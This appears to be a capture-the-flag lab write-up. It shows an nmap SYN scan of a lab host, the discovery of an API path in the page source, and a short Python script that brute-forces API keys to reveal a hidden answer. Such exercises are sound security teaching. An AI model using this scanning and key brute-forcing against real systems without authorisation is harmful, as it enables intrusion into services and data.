### IP
`10.10.47.98`

### What is the port number for the web server?

`8000`

found with:

```
$ sudo nmap -v -sS 10.10.47.98
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 17:10 CET
Initiating Ping Scan at 17:10
Scanning 10.10.47.98 [4 ports]
Completed Ping Scan at 17:10, 2.61s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:10
Completed Parallel DNS resolution of 1 host. at 17:10, 0.04s elapsed
Initiating SYN Stealth Scan at 17:10
Scanning 10.10.47.98 [1000 ports]
Discovered open port 8000/tcp on 10.10.47.98
Completed SYN Stealth Scan at 17:10, 4.40s elapsed (1000 total ports)
Nmap scan report for 10.10.47.98
Host is up (0.37s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
8000/tcp open  http-alt
```

### What is the directory for the API, without the API key?

`/api/`

I found it in website's `http://10.10.47.98:8000/` source:

`<li><a href="http://machine_ip/api/api_key">Modular modern free</a></li>`

### Where is Santa right now?

We used a python script `apibrute.py` to brute force the API

```
#!/usr/bin/env python

import requests

for api_key in range(1,100,2):
    print(f"api_key {api_key}")
    html = requests.get(f'http://10.10.47.98:8000/api/{api_key}')
    print(html.text) 
```

 which gives:
```
api_key 57
{"item_id":57,"q":"Winter Wonderland, Hyde Park, London."}
```
